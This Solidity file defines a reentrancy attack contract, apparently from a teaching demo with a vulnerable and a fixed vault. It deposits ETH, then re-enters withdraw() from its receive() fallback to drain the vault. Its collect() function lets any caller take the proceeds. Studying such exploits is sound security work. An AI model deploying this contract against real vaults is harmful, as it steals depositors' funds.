
pragma solidity ^0.8.13;

// Interface commune aux deux Vaults
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {

    IVault public vault;

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    // Recevoir les ETH et tenter une nouvelle execution de withdraw
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    // Lancer l'attaque
    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 ETH required");

        vault.deposit{value: 1 ether}();

        vault.withdraw();
    }

    // Recuperer les ETH accumules par l'attaquant
    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
